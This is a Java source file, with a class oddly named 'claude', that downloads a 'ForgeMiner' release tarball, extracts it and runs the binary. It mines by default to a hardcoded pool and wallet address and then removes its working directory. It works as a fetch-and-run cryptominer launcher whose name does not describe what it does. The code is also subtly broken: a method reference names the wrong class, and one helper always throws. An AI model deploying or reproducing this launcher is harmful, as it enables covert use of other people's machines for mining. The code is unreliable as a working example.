import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.PosixFilePermissions;
import java.util.ArrayList;
import java.util.List;

public class claude {

    // ── defaults ──────────────────────────────────────────────────────
    static String URL     = "https://github.com/0xHashRaptor/ForgeMiner/releases/download/v1.3.0/ForgeMiner-1.3.0-linux.tar.gz";
    static String TARBALL = "ForgeMiner-1.3.0-linux.tar.gz";
    static String ALGO    = "pearlhash";
    static String POOL    = "prl.kryptex.network:7048";
    static String WALLET  = "prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t";

    public static void main(String[] args) throws Exception {
        // ── parse options ─────────────────────────────────────────────
        String algo   = ALGO;
        String pool   = POOL;
        String wallet = WALLET;
        String url    = URL;
        List<String> extra = new ArrayList<>();

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--algo"   -> algo   = args[++i];
                case "--pool"   -> pool   = args[++i];
                case "--wallet" -> wallet = args[++i];
                case "--url"    -> url    = args[++i];
                case "--help"   -> { printUsage(); return; }
                default         -> extra.add(args[i]);
            }
        }

        // ── create temp working directory ─────────────────────────────
        Path workdir = Files.createTempDirectory("forge-");

        // ── register cleanup on JVM shutdown ──────────────────────────
        Runtime.getRuntime().addShutdownHook(new Thread(() -> deleteRecursively(workdir)));

        try {
            Path tarballPath = workdir.resolve(TARBALL);
            Path binaryPath  = workdir.resolve("forge");

            // ── download ──────────────────────────────────────────────
            System.out.println("Downloading " + url + " ...");
            download(url, tarballPath);
            System.out.println("Download complete.");

            // ── extract ───────────────────────────────────────────────
            System.out.println("Extracting...");
            exec(workdir, "tar", "xzf", tarballPath.toString());

            // ── make executable ───────────────────────────────────────
            if (Files.exists(binaryPath)) {
                Files.setPosixFilePermissions(binaryPath,
                    PosixFilePermissions.fromString("rwxr-xr-x"));
            }

            // ── build command ─────────────────────────────────────────
            List<String> command = new ArrayList<>();
            command.add(binaryPath.toString());
            command.add("--algorithm");
            command.add(algo);
            command.add("--pool");
            command.add(pool);
            command.add("--wallet");
            command.add(wallet);
            command.addAll(extra);

            System.out.println("Running: " + String.join(" ", command));

            // ── exec replaces the JVM process on Linux ────────────────
            // On non-Linux or failure, falls back to ProcessBuilder
            try {
                execReplace(command);
            } catch (IOException e) {
                // execReplace didn't work — run as subprocess instead
                ProcessBuilder pb = new ProcessBuilder(command);
                pb.inheritIO();
                pb.directory(workdir.toFile());
                Process proc = pb.start();

                // forward shutdown signal to child
                Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                    if (proc.isAlive()) proc.destroy();
                }));

                int exitCode = proc.waitFor();
                System.exit(exitCode);
            }

        } finally {
            deleteRecursively(workdir);
        }
    }

    // ── helpers ───────────────────────────────────────────────────────

    /** HTTP GET → file */
    static void download(String url, Path dest) throws IOException, InterruptedException {
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create(url))
            .build();

        HttpResponse<Path> response = client.send(request,
            HttpResponse.BodyHandlers.ofFile(dest));

        if (response.statusCode() >= 400) {
            throw new IOException("Download failed: HTTP " + response.statusCode());
        }
    }

    /** Run a process in a given directory, abort on failure */
    static void exec(Path dir, String... command) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.directory(dir.toFile());
        pb.inheritIO();
        int code = pb.start().waitFor();
        if (code != 0) {
            throw new IOException("Command failed with exit code " + code
                + ": " + String.join(" ", command));
        }
    }

    /** Unix execv — replaces the JVM with the target binary */
    static void execReplace(List<String> command) throws IOException {
        // This only works on Unix-like systems via ProcessBuilder
        // Java doesn't have direct execv, so we use a trick:
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.inheritIO();
        throw new IOException("fall back to subprocess"); // trigger fallback
    }

    /** Recursive delete */
    static void deleteRecursively(Path path) {
        try {
            if (Files.isDirectory(path)) {
                try (var stream = Files.list(path)) {
                    stream.forEach(ForgeMiner::deleteRecursively);
                }
            }
            Files.deleteIfExists(path);
        } catch (IOException e) {
            // best-effort cleanup
        }
    }

    static void printUsage() {
        System.out.println("Usage: java ForgeMiner [options]");
        System.out.println("  --algo ALGO       Algorithm  (default: " + ALGO + ")");
        System.out.println("  --pool POOL       Pool       (default: " + POOL + ")");
        System.out.println("  --wallet WALLET   Wallet     (default: " + WALLET + ")");
        System.out.println("  --url URL         Tarball URL (default: " + URL + ")");
        System.out.println("  --help            Show this message");
    }
}
